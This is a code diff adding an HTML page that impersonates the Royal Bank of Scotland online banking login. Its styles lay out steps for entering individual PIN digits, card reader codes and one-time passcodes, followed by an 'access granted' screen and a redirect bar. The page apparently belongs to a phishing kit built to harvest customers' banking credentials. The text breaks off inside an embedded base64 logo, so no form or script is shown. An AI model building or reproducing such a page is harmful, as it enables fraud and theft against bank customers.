@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Royal Bank of Scotland | Online Banking</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    :root { --bl: #3D1152; --dbl: #2A0A3A; --lbl: #F3EDF7; --ac: #7B2FBE; --bg: #F5F0F7; --bk: #1a1a1a; --gt: #555; --gb: #ccc; }
+    body { font-family: 'Helvetica Neue', Arial, sans-serif; background: var(--bg); color: var(--bk); min-height: 100vh; display: flex; flex-direction: column; }
+    header { background: var(--bl); padding: 0 32px; display: flex; align-items: center; justify-content: space-between; height: 68px; box-shadow: 0 2px 6px rgba(0,0,0,.25); }
+    .logo-badge{height:56px;background:#fff;border-radius:6px;display:flex;align-items:center;justify-content:center;padding:0 12px;overflow:hidden;flex-shrink:0;}
+    .logo { display: flex; align-items: center; gap: 12px; text-decoration: none; }
+    .logo-shield { width: 40px; height: 44px; position: relative; }
+    .logo-name { display: flex; flex-direction: column; line-height: 1.1; }
+    .logo-rbs { color: #fff; font-size: 22px; font-weight: 900; letter-spacing: 2px; }
+    .logo-sub { color: rgba(255,255,255,.7); font-size: 10px; letter-spacing: .5px; text-transform: uppercase; }
+    .header-right a { color: rgba(255,255,255,.85); font-size: 13px; text-decoration: none; margin-left: 16px; }
+    .header-right a:hover { color: #fff; text-decoration: underline; }
+    nav { background: var(--dbl); padding: 0 32px; display: flex; }
+    nav a { font-size: 13px; color: rgba(255,255,255,.7); padding: 12px 16px; text-decoration: none; font-weight: 600; border-bottom: 3px solid transparent; }
+    nav a:hover { color: #fff; }
+    nav a.active { color: #fff; border-bottom-color: var(--ac); }
+    main { flex: 1; display: flex; justify-content: center; padding: 36px 20px 60px; }
+    .wrap { width: 100%; max-width: 980px; display: grid; grid-template-columns: 1fr 300px; gap: 28px; align-items: start; }
+    .card { background: #fff; border-top: 4px solid var(--bl); box-shadow: 0 1px 4px rgba(0,0,0,.1); }
+    .card-head { padding: 22px 28px; border-bottom: 1px solid #eee; }
+    .card-head h1 { font-size: 22px; font-weight: 700; }
+    .steps-bar { display: flex; border-bottom: 1px solid #eee; }
+    .sb { flex: 1; display: flex; align-items: center; justify-content: center; gap: 6px; padding: 10px 4px; font-size: 11px; font-weight: 700; color: #bbb; border-bottom: 3px solid transparent; }
+    .sb.active { color: var(--bl); border-bottom-color: var(--bl); }
+    .sb.done { color: var(--gt); }
+    .sb-num { width: 20px; height: 20px; border-radius: 50%; background: #eee; color: #999; font-size: 10px; font-weight: 800; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+    .sb.active .sb-num { background: var(--bl); color: #fff; }
+    .sb.done .sb-num { background: #28a745; color: #fff; }
+    .card-body { padding: 28px; }
+    .step { display: none; }
+    .step.active { display: block; }
+    .fg { margin-bottom: 20px; }
+    .fg label { display: block; font-size: 13px; font-weight: 700; margin-bottom: 6px; }
+    .fg input { width: 100%; padding: 10px 13px; border: 1px solid var(--gb); font-size: 15px; outline: none; transition: border-color .15s; border-radius: 2px; }
+    .fg input:focus { border-color: var(--bl); box-shadow: 0 0 0 2px rgba(0,45,114,.12); }
+    .hint { font-size: 12px; color: var(--gt); margin-top: 5px; line-height: 1.5; }
+    .btn { width: 100%; padding: 13px; background: var(--bl); color: #fff; font-size: 15px; font-weight: 700; border: none; cursor: pointer; transition: background .15s; margin-bottom: 16px; border-radius: 2px; }
+    .btn:hover { background: var(--dbl); }
+    hr { border: none; border-top: 1px solid #eee; margin: 18px 0; }
+    .links { display: flex; flex-direction: column; gap: 10px; }
+    .links a { font-size: 13px; color: var(--bl); text-decoration: underline; cursor: pointer; }
+    /* PIN step */
+    .pin-info { background: var(--lbl); border: 1px solid #c0d0e8; border-left: 4px solid var(--bl); padding: 14px 16px; margin-bottom: 22px; font-size: 13px; color: var(--dbl); line-height: 1.6; border-radius: 2px; }
+    .pin-info strong { display: block; font-size: 14px; margin-bottom: 4px; }
+    .pin-row { display: flex; gap: 14px; flex-wrap: wrap; }
+    .pin-fg { display: flex; flex-direction: column; align-items: center; gap: 6px; }
+    .pin-fg label { font-size: 11px; font-weight: 700; color: var(--bl); text-transform: uppercase; }
+    .pin-fg input { width: 52px; height: 58px; text-align: center; font-size: 24px; font-weight: 700; border: 1px solid var(--gb); border-radius: 2px; outline: none; }
+    .pin-fg input:focus { border-color: var(--bl); box-shadow: 0 0 0 2px rgba(0,45,114,.12); }
+    /* Card reader */
+    .reader-box { background: var(--lbl); border: 1px solid #c0d0e8; border-left: 4px solid var(--bl); padding: 16px 18px; margin-bottom: 20px; border-radius: 2px; }
+    .reader-head { display: flex; align-items: center; gap: 12px; margin-bottom: 12px; }
+    .reader-icon { width: 48px; height: 36px; background: var(--bl); border-radius: 4px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+    .reader-title { font-size: 14px; font-weight: 700; color: var(--dbl); }
+    .reader-title small { display: block; font-size: 12px; font-weight: 400; color: var(--gt); margin-top: 2px; }
+    .r-steps { list-style: none; counter-reset: rs; display: flex; flex-direction: column; gap: 8px; }
+    .r-steps li { counter-increment: rs; display: flex; align-items: flex-start; gap: 10px; font-size: 13px; color: var(--gt); line-height: 1.5; }
+    .r-steps li::before { content: counter(rs); width: 20px; height: 20px; border-radius: 50%; background: var(--bl); color: #fff; font-size: 11px; font-weight: 700; display: flex; align-items: center; justify-content: center; flex-shrink: 0; margin-top: 1px; }
+    .divider-or { display: flex; align-items: center; gap: 10px; font-size: 12px; color: #888; margin: 16px 0; }
+    .divider-or::before, .divider-or::after { content: ''; flex: 1; border-top: 1px solid #e0e0e0; }
+    .otp-boxes { display: flex; gap: 10px; margin-bottom: 6px; }
+    .otp-boxes input { width: 48px; height: 56px; text-align: center; font-size: 22px; font-weight: 700; border: 1px solid var(--gb); border-radius: 2px; outline: none; }
+    .otp-boxes input:focus { border-color: var(--bl); box-shadow: 0 0 0 2px rgba(0,45,114,.12); }
+    .resend { font-size: 12px; color: var(--gt); margin-bottom: 22px; }
+    .resend a { color: var(--bl); text-decoration: underline; }
+    .granted { text-align: center; padding: 20px 0; }
+    .tick { width: 72px; height: 72px; background: #28a745; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; animation: pop .4s ease; }
+    @keyframes pop { 0%{transform:scale(.4);opacity:0} 80%{transform:scale(1.1)} 100%{transform:scale(1);opacity:1} }
+    .granted h2 { font-size: 22px; font-weight: 700; color: var(--dbl); margin-bottom: 10px; }
+    .granted p { font-size: 14px; color: var(--gt); line-height: 1.6; margin-bottom: 6px; }
+    .redir { margin-top: 24px; background: var(--lbl); border: 1px solid #c0d0e8; padding: 14px; font-size: 13px; color: var(--dbl); border-radius: 2px; }
+    .redir strong { display: block; font-size: 15px; margin-bottom: 4px; }
+    .prog-track { margin-top: 10px; height: 5px; background: #c0d0e8; border-radius: 2px; overflow: hidden; }
+    .prog-fill { height: 100%; width: 0%; background: var(--bl); }
+    .side { display: flex; flex-direction: column; gap: 20px; }
+    .ibox { background: #fff; box-shadow: 0 1px 4px rgba(0,0,0,.08); }
+    .ibox-h { background: var(--bl); padding: 12px 16px; color: #fff; font-size: 13px; font-weight: 700; }
+    .ibox-b { padding: 16px; font-size: 13px; color: var(--gt); line-height: 1.5; }
+    .ibox-b a { color: var(--bl); text-decoration: underline; }
+    .ibox-b p { margin-bottom: 8px; }
+    .warn { background: #FFF8E1; border: 1px solid #F0C040; border-left: 4px solid #e6a817; padding: 14px 16px; font-size: 12px; color: #5A4500; line-height: 1.5; }
+    footer { background: var(--dbl); padding: 20px 32px; }
+    .flinks { display: flex; flex-wrap: wrap; margin-bottom: 12px; }
+    .flinks a { color: #88aacc; font-size: 12px; text-decoration: none; padding: 0 12px; border-right: 1px solid #1a3060; }
+    .flinks a:first-child { padding-left: 0; }
+    .flinks a:last-child { border-right: none; }
+    .fcopy { color: #4a6888; font-size: 11px; line-height: 1.6; }
+    @media (max-width: 720px) { .wrap { grid-template-columns: 1fr; } header, nav { padding-left: 16px; padding-right: 16px; } }
+  
+    @keyframes ld-spin  { to { transform: rotate(360deg); } }
+    @keyframes ld-dots  { 0%,80%,100%{transform:scale(0)}40%{transform:scale(1)} }
+  
+  </style>
+</head>
+<body>
+<header>
+  <a class="logo" href="#"><div class="logo-badge"><img src="data:image/png;base64,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